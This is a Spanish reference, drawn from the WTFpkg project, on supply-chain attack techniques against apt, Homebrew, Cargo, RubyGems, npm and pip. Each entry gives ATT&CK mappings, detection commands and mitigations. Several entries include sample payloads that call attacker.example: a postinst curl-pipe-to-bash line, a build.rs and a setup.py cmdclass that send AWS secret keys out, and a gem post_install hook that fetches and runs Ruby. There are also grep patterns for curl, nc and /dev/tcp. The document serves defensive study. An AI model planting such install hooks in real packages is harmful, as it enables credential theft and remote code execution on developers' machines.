# WTFpkg — Referencia de Técnicas de Ataque a Gestores de Paquetes

> Fuente: https://github.com/0xv1n/WTFpkg  
> Generado: 2026-05-31  
> Cobertura: 27 técnicas × 6 gestores (APT, Homebrew, Cargo, RubyGems, npm, pip)

---

## Índice

| ID | Gestor | Técnica | Severidad |
|----|--------|---------|-----------|
| APT-01 | apt | GPG Signature Verification Bypass | High |
| APT-02 | apt | Malicious Repository Source Injection | High |
| APT-03 | apt | Package Name/Version Spoofing | Medium |
| APT-04 | apt | preinst/postinst Maintainer Script Execution | Critical |
| APT-05 | apt | Repository Man-in-the-Middle (HTTP) | Medium |
| BREW-01 | brew | Cask Flight Block Arbitrary Ruby Execution | High |
| BREW-02 | brew | Cask `pkg` / `installer script` Privilege Escalation | High |
| BREW-03 | brew | Formula `install` Method Code Execution | High |
| BREW-04 | brew | Malicious Third-Party Tap Supply Chain | High |
| CARGO-01 | cargo | `build.rs` Build Script Execution | Critical |
| CARGO-02 | cargo | Crate Extraction Attacks (CVE-2022-36113/36114) | High |
| CARGO-03 | cargo | `cargo install --git` Arbitrary Code Execution | High |
| CARGO-04 | cargo | Procedural Macro Compile-Time Execution | Critical |
| GEM-01 | gem | Build Script Execution via Gemspec Extensions | High |
| GEM-02 | gem | Install Hook Abuse (`rubygems_plugin.rb`) | High |
| GEM-03 | gem | Native Extension Code Execution (`extconf.rb`) | Critical |
| GEM-04 | gem | Source Manipulation / Dependency Confusion | Medium |
| NPM-01 | npm | Dependency Confusion | High |
| NPM-02 | npm | Lifecycle Script Abuse | Critical |
| NPM-03 | npm | `.npmrc` Manipulation | Medium |
| NPM-04 | npm | `npx` Remote Execution / Typosquatting | High |
| NPM-05 | npm | Package Hijacking via Credential Compromise | Critical |
| PIP-01 | pip | `cmdclass` Override in `setup.py` | Critical |
| PIP-02 | pip | Dependency Confusion | High |
| PIP-03 | pip | `requirements.txt` Index Manipulation | High |
| PIP-04 | pip | `setup.py` Arbitrary Code Execution | Critical |
| PIP-05 | pip | Typosquatting | Medium |

---

## APT / dpkg

### APT-01 — GPG Signature Verification Bypass

**Plataforma:** Linux  
**ATT&CK:** T1195.001 (Supply Chain Compromise), T1562.001 (Impair Defenses)

#### Descripción
La verificación GPG de APT puede ser desactivada mediante configuración o flags de línea de comando, permitiendo instalar paquetes sin autenticación criptográfica.

#### Mecanismos de Bypass

| Método | Artefacto | Descripción |
|--------|-----------|-------------|
| `trusted=yes` en sources.list | `/etc/apt/sources.list[.d/]` | Desactiva toda verificación GPG para ese repositorio |
| `--allow-unauthenticated` | CLI arg en apt-get | Suprime errores de firma en tiempo de instalación |
| CVE-2019-3462 | APT < 1.4.9/1.6.6/1.7.1 | Redirect HTTP sirve Release file malicioso sin verificación |

#### Indicadores de Detección
- `grep -rn "trusted=yes"` en `/etc/apt/`
- Invocaciones de `apt-get` con `--allow-unauthenticated` en logs
- `APT::Get::AllowUnauthenticated "true"` en `/etc/apt/apt.conf.d/`

#### Mitigación
- Restringir `trusted=yes` exclusivamente a repos locales de desarrollo
- `APT::Get::AllowUnauthenticated "false"` en configuración global
- Mantener APT >= 1.4.9 / 1.6.6 / 1.7.1

---

### APT-02 — Malicious Repository Source Injection

**Plataforma:** Linux  
**ATT&CK:** T1195.001, T1053.003 (Cron para persistencia)

#### Descripción
Inyección de repositorios maliciosos en la configuración APT. Los paquetes firmados por el atacante se instalan como si fueran legítimos.

#### Vectores de Ataque

| Vector | Mecanismo |
|--------|-----------|
| Social engineering / PPA | Usuario convencido de ejecutar `add-apt-repository` |
| Direct source injection | Escritura directa en `/etc/apt/sources.list.d/` con acceso root |
| Persistencia via cron/systemd | Timer restaura la entrada maliciosa tras ser eliminada |

#### Artefactos Observables
- Nuevos ficheros `.list` en `/etc/apt/sources.list.d/` creados en momentos inusuales
- Cron jobs o unidades systemd que ejecutan `apt-get update` o modifican sources
- Claves GPG añadidas a `/etc/apt/trusted.gpg.d/` no reconocidas

#### Mitigación
- File integrity monitoring en `/etc/apt/`
- Restricción de permisos de escritura al directorio de sources
- Auditoría periódica de claves GPG confiadas

---

### APT-03 — Package Name/Version Spoofing

**Plataforma:** Linux  
**ATT&CK:** T1195.001, T1036 (Masquerading)

#### Descripción
Un atacante con control sobre un repositorio APT confiado crea paquetes con versiones artificialmente infladas para desplazar instalaciones legítimas.

#### Técnicas de Manipulación de Versión

| Técnica | Ejemplo | Efecto |
|---------|---------|--------|
| Epoch manipulation | `99:8.9p1-1` | Epoch 99 precede a cualquier versión sin epoch |
| Version string crafting | `1.0+malicious` | Comparación lexicográfica favorece al atacante |

#### Indicadores
- `apt-cache policy <paquete>` muestra fuente inesperada
- Paquetes con epoch > 5 (la mayoría de paquetes legítimos usan epoch 0 o 1)

#### Mitigación
- APT pinning en `/etc/apt/preferences.d/` para priorizar repos oficiales
- `apt-mark hold` en paquetes críticos
- Auditoría periódica de `apt-cache policy` para paquetes sensibles

---

### APT-04 — preinst/postinst Maintainer Script Execution

**Plataforma:** Linux  
**ATT&CK:** T1195.001, T1059.004 (Unix Shell), T1078 (Valid Accounts — root context)

#### Descripción
Los paquetes Debian ejecutan scripts de mantenimiento (preinst, postinst, prerm, postrm) con privilegios root durante el ciclo de vida de instalación. Cualquier paquete .deb puede embeber comandos arbitrarios.

#### Scripts de Riesgo

| Script | Cuándo se ejecuta |
|--------|-------------------|
| `preinst` | Antes de extraer ficheros del paquete |
| `postinst` | Tras instalar ficheros; el más comúnmente abusado |
| `prerm` | Antes de eliminar el paquete |
| `postrm` | Tras eliminar ficheros; útil para persistencia |

#### Payload Típico (postinst)
```bash
#!/bin/sh
# Apariencia legítima...
/usr/bin/setup-tool --configure
# Payload real:
curl -s http://attacker.example/s.sh | bash &
```

#### Artefactos Observables
- `dpkg` / `apt-get` como proceso padre de `bash`, `curl`, `wget`, `nc`, `python`
- Procesos de red originados durante instalación de paquetes
- Ficheros en `/var/lib/dpkg/info/*.postinst` con patrones sospechosos

#### Detección
```bash
# Pre-instalación: inspeccionar sin ejecutar
dpkg-deb -e paquete.deb /tmp/control
grep -r "curl\|wget\|nc \|bash.*-i\|python.*-c" /tmp/control/

# Post-instalación: revisar scripts activos
grep -r "curl\|wget\|nc \|/dev/tcp" /var/lib/dpkg/info/*.postinst
```

#### Mitigación
- Verificar firma GPG antes de instalar paquetes externos
- `dpkg-deb -e` para inspección previa
- AppArmor/SELinux confinando dpkg
- File integrity monitoring en `/var/lib/dpkg/info/`

---

### APT-05 — Repository Man-in-the-Middle (HTTP)

**Plataforma:** Linux  
**ATT&CK:** T1557 (Adversary-in-the-Middle), T1195.001

#### Descripción
Repositorios APT accedidos por HTTP permiten a un adversario con posición de red interceptar y sustituir paquetes .deb por versiones troyanizadas.

#### Vectores
- ARP spoofing + mitmproxy para sustituir .deb en tránsito
- DNS poisoning para redirigir repositorio a servidor controlado por atacante

#### Indicadores
- `grep -rn "^deb http://" /etc/apt/sources.list` — fuentes HTTP sin cifrar
- MACs duplicados en la red (ARP spoofing)
- Discrepancias de checksum al verificar contra metadata oficial

#### Mitigación
- Migrar todas las fuentes APT a HTTPS
- Verificación GPG obligatoria
- Protecciones de red contra ARP spoofing (DAI en switches)

---

## Homebrew

### BREW-01 — Cask Flight Block Arbitrary Ruby Execution

**Plataforma:** macOS  
**ATT&CK:** T1195.001, T1059.004 (Ruby como intérprete), T1543.001 (LaunchAgent)

#### Descripción
Las Casks de Homebrew soportan cuatro stanzas de "flight" que ejecutan bloques Ruby arbitrarios alrededor del ciclo de instalación/desinstalación, sin sandboxing.

#### Stanzas de Riesgo

| Stanza | Momento de ejecución |
|--------|----------------------|
| `preflight` | Antes de instalar el paquete |
| `postflight` | Después de instalar el paquete |
| `uninstall_preflight` | Antes de desinstalar |
| `uninstall_postflight` | Después de desinstalar — vector de persistencia post-remoción |

#### Capacidades del Atacante
- Ejecución directa de código arbitrario
- Escalada de privilegios si la cask declara stanza `pkg` con autenticación
- Instalación de LaunchAgent/LaunchDaemon durante desinstalación (persistencia)

#### Detección
```bash
brew cat --cask <nombre> | grep -nE "preflight|postflight|allow_untrusted"
```

#### Mitigación
- Inspeccionar definición de cask antes de `brew install --cask`
- Instalar desde usuario no-administrador
- Auditar taps de terceros — mayor riesgo que homebrew/cask oficial

---

### BREW-02 — Cask `pkg` / `installer script` Privilege Escalation

**Plataforma:** macOS  
**ATT&CK:** T1195.001, T1548.004 (Elevated Execution), T1543.004 (LaunchDaemon)

#### Descripción
Las stanzas `pkg` e `installer script: sudo: true` ejecutan código como root al instalar una Cask. `allow_untrusted: true` omite verificación de certificados.

#### Vectores

| Stanza | Mecanismo |
|--------|-----------|
| `pkg` | Paquete .pkg con scripts de instalación ejecutados como root |
| `installer script: + sudo: true` | Ejecuta binario arbitrario como root sin paquete firmado |
| `allow_untrusted: true` | Omite verificación de certificado del .pkg |

#### Post-Remediation Risk
Desinstalar la cask maliciosa no es suficiente: `brew upgrade --cask` puede reinstalar silenciosamente el payload.

#### Artefactos Observables
- `/Library/LaunchDaemons/` con nuevos plists creados durante operaciones brew
- `installer(8)` invocaciones en unified log del sistema
- Procesos root cuyo parent es ruby/brew

#### Mitigación
- Inspeccionar definición completa de cask; legitimas solo necesitan stanza `app`
- MDM para deshabilitar instalaciones de Cask en fleets gestionadas
- Rechazar `allow_untrusted` en políticas de seguridad

---

### BREW-03 — Formula `install` Method Code Execution

**Plataforma:** macOS, Linux  
**ATT&CK:** T1195.001, T1059.004, T1543.001 (LaunchAgent persistence)

#### Descripción
Las fórmulas Homebrew son ficheros Ruby que definen un método `install` ejecutado por `brew install`. Tienen acceso sin restricciones al sistema de ficheros, red, y ejecución de subprocesos. El código Ruby no está vinculado criptográficamente a versiones revisadas.

#### Capacidades del Atacante
- **Exfiltración de datos**: archivar credenciales SSH, historial de shell y enviarlas a servidor remoto antes de completar instalación aparentemente normal
- **Persistencia**: escribir plists de LaunchAgent ejecutando payloads en cada login
- Sin advertencias al usuario durante ejecución normal de `brew install`

#### Detección
```bash
brew cat <formula>         # inspeccionar método install
git log --oneline -20      # en directorio del tap: auditar cambios recientes
```
Monitorizar `~/Library/LaunchAgents/` y conexiones de red originadas desde procesos ruby durante instalaciones.

#### Mitigación
- Preferir homebrew/core y homebrew/cask (requieren revisión pública)
- `brew install` desde usuario sin acceso a credenciales sensibles

---

### BREW-04 — Malicious Third-Party Tap Supply Chain

**Plataforma:** macOS, Linux  
**ATT&CK:** T1195.001, T1036.005 (Match Legitimate Name or Location)

#### Descripción
`brew tap <user>/<repo>` añade una fuente git de terceros que evita el proceso de revisión de homebrew-core. Los atacantes explotan esto mediante typosquatting de nombres de taps populares o compromiso de credenciales del mantenedor.

#### Vectores

| Vector | Mecanismo |
|--------|-----------|
| Typosquatting | `hashi-corp/tap` vs `hashicorp/tap` |
| Credential compromise | Acceso a cuenta mantenedor → push silencioso de código malicioso |
| Formula shadowing | Publicar fórmula con mismo nombre que paquete de core |

#### Detección
```bash
brew tap                    # listar todos los taps activos
# Verificar que cada URL de remote coincide con documentación oficial del vendor
```

#### Mitigación
- `HOMEBREW_NO_AUTO_UPDATE=1` para revisión manual de diffs antes de actualizar
- Restringir clonado git a organizaciones aprobadas (gestión MDM)
- Usar nombres completamente cualificados en scripts para evitar formula shadowing

---

## Cargo / Rust

### CARGO-01 — `build.rs` Build Script Execution

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1059.004/T1059.001 (shell/PS según SO), T1552.004 (Private Keys)

#### Descripción
Cargo compila y ejecuta automáticamente `build.rs` antes de construir cualquier crate que lo contenga. Estos scripts se ejecutan como binario nativo con acceso completo al sistema: filesystem, red (`std::net`), y ejecución arbitraria (`std::process::Command`).

#### Características del Ataque
- Ejecución durante `cargo build`, `cargo install`, `cargo test`
- Sin confirmación del usuario ni sandboxing
- Se mezcla con actividad normal de compilación
- Objetivo principal: entornos CI/CD con credenciales elevadas (AWS keys, tokens)

#### Payload Típico (`build.rs`)
```rust
fn main() {
    // Finge hacer algo legítimo...
    println!("cargo:rerun-if-changed=build.rs");
    // Exfiltración real:
    if let Ok(key) = std::env::var("AWS_SECRET_ACCESS_KEY") {
        let _ = std::process::Command::new("curl")
            .args(["-s", "-d", &key, "https://attacker.example/c"])
            .output();
    }
}
```

#### Detección
- Inspeccionar `build.rs` en dependencias vendorizadas buscando `std::net`, `Command::new`, acceso a variables de entorno con nombres de credenciales
- Monitorizar procesos hijo de `rustc` durante `cargo build`
- Tráfico de red inesperado desde build environments

#### Mitigación
- Vendorizar dependencias y auditar `build.rs` antes del build
- Builds en contenedores con red aislada
- `cargo-crev` para revisiones de la comunidad
- Pinning de versiones exactas

---

### CARGO-02 — Crate Extraction Attacks

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1083 (File and Directory Discovery), T1499.004 (Application or System Exploitation — disk exhaustion)

#### CVEs Relevantes

| CVE | Tipo | Versión afectada |
|-----|------|-----------------|
| CVE-2022-36113 | Symlink traversal en extracción de .crate | Rust < 1.64.0 |
| CVE-2022-36114 | Archive bomb — exhaustión de disco | Rust < 1.64.0 |

#### Descripción
- **CVE-2022-36113**: .crate contiene symlinks apuntando fuera del directorio de extracción → sobrescritura de ficheros arbitrarios (configs, scripts de inicio)
- **CVE-2022-36114**: .crate con ratio de compresión extremo → DoS por agotamiento de disco en máquinas de desarrollo y CI/CD

#### Detección
```bash
# Symlinks en crates extraídos
find ~/.cargo/registry/src/ -type l -ls

# Picos de uso de disco durante cargo operations
```

#### Mitigación
- Actualizar a Rust >= 1.64.0 (parche primario)
- Quotas de disco en entornos de build
- Builds containerizados con asignación restringida de disco

---

### CARGO-03 — `cargo install --git` Arbitrary Code Execution

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1552.001 (Credentials In Files — CI tokens)

#### Descripción
`cargo install --git <url>` clona un repositorio arbitrario y ejecuta su `build.rs` y proc-macros. En entornos CI/CD, esto permite a cualquier URL de git obtener ejecución de código con los privilegios del runner.

#### Vectores

| Vector | Riesgo |
|--------|--------|
| Repositorio comprometido | Build.rs exfiltra env vars con credenciales de despliegue |
| Dependencia git sin pin de commit | Push malicioso en el repo activa ejecución en siguiente build |
| PR que sustituye crates.io dep por git fork | Build.rs con backdoor en fork del atacante |

#### Indicadores en CI/CD
```bash
# Buscar en configs de CI
grep -rn "cargo install --git" .github/ .gitlab-ci.yml Jenkinsfile Makefile

# Dependencias git sin rev= (peligrosas)
grep -n "git = " Cargo.toml | grep -v "rev ="
```

#### Mitigación
- Pinning de todas las dependencias git con `rev = "<commit-hash>"`
- Preferir crates.io sobre dependencias git
- `cargo vendor` para auditoría offline
- Sustituir `cargo install --git` por binarios precompilados en CI/CD

---

### CARGO-04 — Procedural Macro Compile-Time Execution

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1059 (Command and Scripting Interpreter)

#### Descripción
Los proc-macros Rust (`proc-macro = true` en Cargo.toml) ejecutan código Rust arbitrario en tiempo de compilación con acceso completo al filesystem, red y comandos del sistema. Un desarrollador que añade una dependencia comprometida como macro desencadena ejecución durante `cargo build` o `cargo check` — sin interacción en runtime.

#### Capacidades
- Exfiltración del código fuente y secretos
- Inyección de backdoors en el binario compilado
- Instalación de mecanismos de persistencia (cron, reverse shell)
- Ejecución silenciosa mientras genera código aparentemente válido

#### Detección
```bash
# Identificar proc-macro crates
cargo metadata --format-version 1 | python3 -c "
import json, sys
md = json.load(sys.stdin)
for p in md['packages']:
    for t in p.get('targets', []):
        if 'proc-macro' in t.get('kind', []):
            print(p['name'], p['version'], p.get('source','local'))
"

# Monitorizar procesos hijo de rustc
strace -f -e execve cargo build 2>&1 | grep -v "rustc\|/usr/bin\|/lib"
```

#### Mitigación
- Auditoría exhaustiva de dependencias proc-macro antes de adopción
- Builds en entornos con red aislada
- Pinning de versiones y revisión de cambios en updates
- `cargo-crev` / `cargo-sandbox`

---

## RubyGems

### GEM-01 — Build Script Execution via Gemspec Extensions

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1059.004

#### Descripción
El campo `extensions` en gemspec puede referenciar Rakefiles además de `extconf.rb`. RubyGems ejecuta automáticamente estas tareas durante `gem install` o `bundle install`.

#### Mecanismo
```ruby
# En el .gemspec:
s.extensions = ['Rakefile']   # o ['ext/Rakefile']
```
El Rakefile puede contener cualquier código Ruby ejecutado con privilegios del usuario instalador.

#### Capacidades del Atacante
- Robo de credenciales (SSH keys, variables de entorno)
- Persistencia (reverse shells, tareas programadas)
- Reconocimiento del sistema
- Entrega encadenada de payloads desde múltiples ficheros de extensión

#### Detección
```bash
# Inspeccionar el campo extensions antes de instalar
gem specification <gem-name> extensions

# Desempaquetar y auditar
gem unpack <gem-name>
cat <gem-name>/Rakefile | grep -E "system|`|exec|open|require|net/http"
```

#### Mitigación
- Sandboxing (Docker) para instalaciones de gems no confiados
- Allow-list de gems en entornos de producción

---

### GEM-02 — Install Hook Abuse (`rubygems_plugin.rb`)

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1546 (Event Triggered Execution), T1574 (Hijack Execution Flow)

#### Descripción
Ficheros `rubygems_plugin.rb` en el directorio `lib/` de un gem son cargados automáticamente por RubyGems. Un atacante puede registrar hooks `Gem.post_install` que ejecutan código arbitrario cada vez que el usuario instala **cualquier** gem posteriormente.

#### Mecanismo
```ruby
# lib/rubygems_plugin.rb dentro del gem malicioso
Gem.post_install do |installer|
  # Ejecutado en CADA gem install futuro
  system("curl -s http://attacker.example/p | ruby")
end
```

#### Riesgo
Transforma el gestor de paquetes en un backdoor persistente. Sobrevive a múltiples operaciones de gem sin requerir acceso a configuraciones del sistema.

#### Detección
```bash
# Buscar plugins instalados
find $(gem environment gemdir) -name "rubygems_plugin.rb" -exec grep -l "post_install\|pre_install\|system\|exec\|backtick" {} \;
```

#### Mitigación
- Auditoría periódica de gems instalados buscando `rubygems_plugin.rb`
- Entornos containerizados para instalaciones
- File system monitoring en directorios de plugins

---

### GEM-03 — Native Extension Code Execution (`extconf.rb`)

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1059.004

#### Descripción
Las extensiones nativas C en gems requieren `extconf.rb` para generar el Makefile de compilación. Este script Ruby se ejecuta automáticamente durante `gem install` o `bundle install` con privilegios completos del usuario.

#### Capacidades
- Ejecución de comandos del sistema vía `system()`, backticks, o `Kernel.exec`
- Exfiltración de variables de entorno (AWS keys, CI tokens)
- Descarga y ejecución de payloads adicionales
- Establecimiento de reverse shells

#### Vectores de Entrega
- Publicación en rubygems.org
- Entrega directa de fichero `.gem`

#### Detección
```bash
# Inspeccionar antes de instalar
gem unpack <gem-name> && grep -rn "system\|\`\|exec\|open\|Net::HTTP" <gem-name>/ext/
# o con strace/dtruss durante instalación
strace -e network gem install <gem-name> 2>&1 | head -50
```

#### Mitigación
- Revisar `extconf.rb` antes de instalar
- Contenedores/VMs aislados para instalaciones
- `bundle install --deployment` con lockfile explícito

---

### GEM-04 — Source Manipulation / Dependency Confusion

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1036 (Masquerading)

#### Descripción
RubyGems permite configurar múltiples fuentes. Cuando los proyectos declaran múltiples sources sin pinning por repositorio, la lógica de resolución puede seleccionar un paquete de rubygems.org público con versión mayor que la interna.

#### Vectores

| Vector | Mecanismo |
|--------|-----------|
| Malicious source addition | `gem sources --add http://malicious.example/` globalmente |
| Gemfile multi-source exploitation | Bundler selecciona el gem de mayor versión sin importar fuente |
| Internal gem targeting | Atacante publica versión mayor en rubygems.org del gem interno |

#### Detección
```bash
gem sources --list           # auditar fuentes configuradas
grep -n "source" Gemfile     # múltiples source declarations = riesgo
grep -n "source:" Gemfile.lock  # verificar fuentes de resolución actual
```

#### Mitigación
- Bundler 2.x+ con source blocks por gem
- Registrar nombres de gems internos en rubygems.org como placeholder

---

## npm

### NPM-01 — Dependency Confusion

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1036.005

#### Descripción
Publicación en npm público de paquetes con el mismo nombre que paquetes privados (unscoped) de la organización con versión mayor. npm resuelve el público en lugar del privado cuando `--extra-registry-url` está configurado.

#### Condiciones Necesarias
- Paquetes privados sin scope (`@org/nombre`)
- Configuración `.npmrc` con `--extra-index-url` / proxy registry sin scope
- Nombres de paquetes internos descubiertos vía source maps, lock files, o configs expuestas

#### Indicadores
- `package-lock.json` con resoluciones inesperadas desde `registry.npmjs.org` para paquetes que deberían ser internos
- Dependencias unscoped sin reserva de nombre en npm público

#### Mitigación
- Usar **exclusivamente** paquetes con scope (`@org/nombre`)
- Configurar `.npmrc` con restricciones de registry por scope
- Reservar nombres de paquetes internos en npm público como placeholder

---

### NPM-02 — Lifecycle Script Abuse

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1059.004/T1059.007, T1543 (persistence)

#### Descripción
Los lifecycle scripts de npm (`preinstall`, `install`, `postinstall`, `prepare`) ejecutan comandos shell arbitrarios durante `npm install` con mínima interacción del usuario.

#### Vectores de Payload

| Script | Riesgo |
|--------|--------|
| `preinstall` | Ejecuta antes de extraer el paquete |
| `postinstall` | El más frecuente; descarga y ejecuta malware, registra servicios |
| `prepare` | Se ejecuta también en `npm pack` y con Yarn |

#### Incidentes Reales
- **eslint-scope** (2018): postinstall exfiltró tokens npm
- **event-stream** (2018): dependencia maliciosa añadida a popular paquete

#### Detección
```bash
# Pre-instalación
npm pack <package-name> && tar -tzf *.tgz
npm show <package-name> scripts
# En CI/CD:
npm install --ignore-scripts   # desactiva lifecycle scripts
```

#### Mitigación
- `--ignore-scripts` en CI/CD + revisión manual posterior
- Socket.dev / `npm audit` en pipelines
- Pinning exacto de versiones en `package-lock.json`
- Restricción de red durante builds

---

### NPM-03 — `.npmrc` Manipulation

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1552.001 (Credentials In Files), T1071.001 (Web Protocols)

#### Descripción
Los ficheros `.npmrc` controlan el comportamiento npm: URLs de registry, tokens de autenticación, y configuraciones de seguridad. Un atacante con acceso de escritura puede redirigir instalaciones a registries maliciosos o deshabilitar verificación SSL.

#### Vectores

| Vector | Artefacto | Efecto |
|--------|-----------|--------|
| Registry redirection | `registry=http://malicious.example/` | Todas las instalaciones van al servidor del atacante |
| Token theft | Lectura de `~/.npmrc` | Extrae tokens de autenticación npm |
| Security bypass | `strict-ssl=false` / `ignore-scripts=false` | Desactiva protecciones |

#### Ubicaciones de `.npmrc`
- Proyecto: `.npmrc` en raíz del repo
- Usuario: `~/.npmrc`
- Global: `$(npm config get globalconfig)`

#### Detección
```bash
npm config list --json   # ver configuración efectiva
git log -p --all -- .npmrc   # cambios históricos al .npmrc del proyecto
```

#### Mitigación
- Version-control de `.npmrc` con code review obligatorio
- Credenciales en variables de entorno, no en ficheros
- File integrity monitoring en sistemas de desarrolladores

---

### NPM-04 — `npx` Remote Execution / Typosquatting

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1036.005 (Typosquatting), T1204.002 (User Execution)

#### Descripción
`npx` descarga y ejecuta paquetes npm sin instalación previa ni revisión. Un typo en el nombre del paquete ejecuta código del atacante inmediatamente.

#### Riesgo Crítico en CI/CD
Scripts de CI frecuentemente usan `npx` para ejecutar herramientas de build sin gestionar instalaciones locales. Un atacante que compromete el nombre de paquete referenciado en el pipeline obtiene ejecución de código en el servidor.

#### Patrones de Typosquatting Comunes
- `create-raect-app` → `create-react-app`
- `expresss` → `express`
- `lodahs` → `lodash`

#### Mitigación
- Instalar CLI tools explícitamente en lugar de usar `npx` ad-hoc
- Usar versiones pinadas: `npx create-react-app@5.0.1`
- Evitar `npx --yes` en CI/CD
- Auditar todas las referencias a `npx` en workflows y documentación

---

### NPM-05 — Package Hijacking via Credential Compromise

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1078 (Valid Accounts), T1199 (Trusted Relationship)

#### Descripción
Compromiso de credenciales de mantenedores para publicar versiones troyanizadas de paquetes legítimos. El **incidente Axios de marzo 2026** comprometió ~100M proyectos/semana al publicar versiones backdoored (1.14.1 y 0.30.4) con una dependencia maliciosa entregando RATs multiplataforma.

#### Mecanismo de Amplificación
La estructura transitiva de dependencias amplifica el impacto: un paquete comprometido infecta miles de proyectos downstream que no son conscientes de la vulnerabilidad en su cadena de dependencias.

#### Indicadores
- Versiones publicadas sin correspondencia en CHANGELOG/GitHub releases
- Nuevas dependencias añadidas en actualizaciones de versión minor/patch
- Cambios de comportamiento en código vs versión anterior (diff)

#### Mitigación
- 2FA obligatorio en cuentas de mantenedores con alto impacto
- `npm ci` + verificación de lockfile en producción
- npm provenance attestations
- Suscripción a advisories de seguridad npm

---

## pip / Python

### PIP-01 — `cmdclass` Override en `setup.py`

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1059.006 (Python)

#### Descripción
El parámetro `cmdclass` de setuptools permite sobreescribir comandos built-in de instalación (`install`, `develop`, `egg_info`, `build_ext`) con clases Python personalizadas. El código malicioso se mezcla con personalizaciones legítimas de build.

#### Vectores

| Comando Override | Trigger | Riesgo |
|-----------------|---------|--------|
| `install` | `pip install` | Exfiltración en instalación |
| `egg_info` | `pip download` / `pip install --dry-run` | Ejecución incluso sin instalar (algunas versiones de pip) |
| `develop` | `pip install -e` | Objetivo: entornos de desarrollo con credenciales |

#### Ejemplo
```python
from setuptools import setup, Command
from setuptools.command.install import install

class MaliciousInstall(install):
    def run(self):
        import urllib.request
        urllib.request.urlopen("http://attacker.example/c?k=" + 
            __import__('os').environ.get('AWS_SECRET_ACCESS_KEY',''))
        install.run(self)

setup(cmdclass={'install': MaliciousInstall}, ...)
```

#### Nota Importante
Migrar a `pyproject.toml` **no elimina** el riesgo de ejecución de código en tiempo de build.

#### Mitigación
- `pip install --only-binary :all:` para saltarse `setup.py`
- Auditar `cmdclass` en `setup.py` antes de instalaciones desde fuente

---

### PIP-02 — Dependency Confusion (pip)

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1036.005

#### Descripción
Pip con `--extra-index-url` busca simultáneamente en PyPI público y registros privados. Un atacante que publique un paquete en PyPI con el mismo nombre que un paquete interno pero versión mayor obtendrá resolución preferente.

#### Condición Crítica
`--extra-index-url` (inseguro) vs `--index-url` (seguro):
- `--extra-index-url`: busca en PyPI público **y** registry privado → vulnerable
- `--index-url`: usa **solo** el registry especificado (configurado para proxiar PyPI) → seguro

#### Historia
Alex Birsan (2021) comprometió con éxito builds de Apple, Microsoft y otras grandes organizaciones usando esta técnica.

#### Mitigación
- Sustituir `--extra-index-url` por `--index-url` apuntando a registry privado configurado como proxy
- `pip install --require-hashes` con hashes en requirements
- Reservar nombres de paquetes internos en PyPI

---

### PIP-03 — `requirements.txt` Index Manipulation

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1071.001 (TLS bypass)

#### Descripción
pip soporta opciones globales dentro de `requirements.txt` que pueden redirigir descargas a servidores maliciosos.

#### Directivas de Riesgo en requirements.txt

| Directiva | Efecto |
|-----------|--------|
| `--index-url http://malicious.example/` | Todos los paquetes del fichero desde servidor malicioso |
| `--extra-index-url http://malicious.example/` | Source adicional con potencial de dependency confusion |
| `--find-links http://malicious.example/` | Busca wheels en URL controlada por atacante |
| `--trusted-host malicious.example` | Desactiva verificación TLS → MITM |

#### Detección
```bash
grep -rn "\-\-index-url\|\-\-extra-index-url\|\-\-find-links\|\-\-trusted-host" requirements*.txt pip.conf
```

#### Mitigación
- URL de index en `pip.conf` o variables de entorno CI, nunca en `requirements.txt`
- Pre-commit hooks rechazando directivas URL en requirements
- pip-tools / poetry / pdm para separar especificación de resolución

---

### PIP-04 — `setup.py` Arbitrary Code Execution

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1059.006, T1543.003 (Cron/Scheduled Task — persistence)

#### Descripción
El workflow legacy de setuptools ejecuta `setup.py` con privilegios completos del usuario durante `pip install` desde source distribution (sdist). Sin sandboxing.

#### Vectores de Payload

| Técnica | Descripción |
|---------|-------------|
| Env var exfiltration | Recoger AWS keys, API tokens, CI/CD secrets → servidor del atacante |
| Reverse shell | Embed de payload shell que establece conexión interactiva |
| Persistent backdoor | Override de `install` command para desplegar cron job / tarea programada |

#### Detección
```bash
# Descargar sin ejecutar y revisar
pip download <paquete> --no-deps -d /tmp/pkg-review/
python3 -c "import tarfile; t=tarfile.open('/tmp/pkg-review/<pkg>.tar.gz'); [print(m.name) for m in t.getmembers()]"
# Buscar patrones en setup.py
grep -E "import subprocess|import socket|urllib|requests|os\.system|exec\(" setup.py

# Monitorizar durante instalación
strace -f -e network,openat pip install <paquete> 2>&1 | head -100
```

#### Nota
PEP 517/518 y `pyproject.toml` **no eliminan** el riesgo; los backends de build y sus dependencias siguen requiriendo revisión.

#### Mitigación
- `pip install --only-binary :all:` (instala solo wheels, evita `setup.py`)
- Entornos aislados (contenedores, VMs, runners CI con red filtrada)
- `--require-hashes` para verificación de integridad
- `pip-audit` antes de instalación

---

### PIP-05 — Typosquatting en PyPI

**Plataforma:** Linux, macOS, Windows  
**ATT&CK:** T1195.001, T1036.005 (Match Legitimate Name)

#### Descripción
Registro en PyPI de nombres que son variantes intencionadas de paquetes populares para engañar a usuarios durante instalación. PyPI **no realiza comprobaciones de similitud** de nombres.

#### Técnicas de Typosquatting

| Técnica | Ejemplo |
|---------|---------|
| Duplicación de caracteres | `requestss` → `requests` |
| Omisión de caracteres | `requsts` → `requests` |
| Confusión de namespace | Normalización de guiones/underscores |
| Campañas en bulk | Registro simultáneo de múltiples variantes de paquetes populares |

#### Payloads Habituales
- Exfiltración de datos en hooks de `setup.py`
- Cryptominers instalados durante `pip install`
